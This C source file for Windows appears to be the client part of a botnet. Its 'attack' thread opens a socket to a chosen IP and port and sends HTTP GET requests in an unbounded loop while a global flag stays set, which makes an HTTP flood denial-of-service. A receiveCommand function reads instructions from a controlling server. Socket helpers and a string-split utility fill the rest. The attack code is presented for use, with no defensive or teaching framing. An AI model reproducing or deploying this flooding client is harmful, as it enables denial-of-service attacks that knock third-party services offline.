#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include <assert.h>
#include "utils.h"


DWORD WINAPI attack(LPVOID addr){
    struct address target = *(struct address*)addr;
    const char* target_ip = target.ip;
    int port = target.port;
    SOCKET target_socket;
    struct sockaddr_in target_addr;
    WSADATA wsaData;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    startWinsock(&wsaData);
    target_socket = startSocket();
    connectSocket(&target_addr, target_socket, target_ip);
    char msg[64];
    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
    // printf("%i", sprintf_stat);
    while(1){
        if (running){
            sendMsg(target_socket, msg);
        } else {
            break;
        }
    }
    closeSocket(target_socket);
    return 0;
}

// function to initialize Winsock so that we can use sockets
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

// function to start the socket and handles errors
SOCKET startSocket() {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return sock;
}

// function to connect this client to the server via socket
int connectSocket(struct sockaddr_in *addr, SOCKET socket, const char* ip) {
    
    if (inet_pton(AF_INET, ip, &addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(socket);
        WSACleanup();
        return 0;
    } else if (connect(socket, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", socket);
        closesocket(socket);
        WSACleanup();
        return 0;
    } else {
        printf("Connection successful.\n");
        return 1;
    }
    return 1;
}

// function to send message via socket connection
void sendMsg(SOCKET socket, const char *msg) {
    int sent = send(socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

// function to close the socket and clean up the resources that are no longer being used
void closeSocket(SOCKET socket) {
    int stat1 = closesocket(socket);
    int stat2 = WSACleanup();
    if (stat1 == 0 && stat2 == 0 ){
        printf("Connection closed. \n");
    }
}

// function to receive commands
void receiveCommand(SOCKET server_socket, char *cmd){
    int received = recv(server_socket, cmd, 1024, 0);
    if (received < 1){
        printf("Error receiving message.\n");
    }
}

// got this neat function from here:
// https://stackoverflow.com/questions/9210528/split-string-with-delimiters-in-c
char** split(char* str, const char d){
    char** result    = 0;
    int count        = 0;
    char* tmp        = str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = d;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp){
        if (d == *tmp)
        {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (str + strlen(str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = (char**) malloc(sizeof(char*) * count);

    if (result){
        size_t idx  = 0;
        char* token = strtok(str, delim);

        while (token){
            assert(idx < count);
            *(result + idx++) = strdup(token);
            token = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}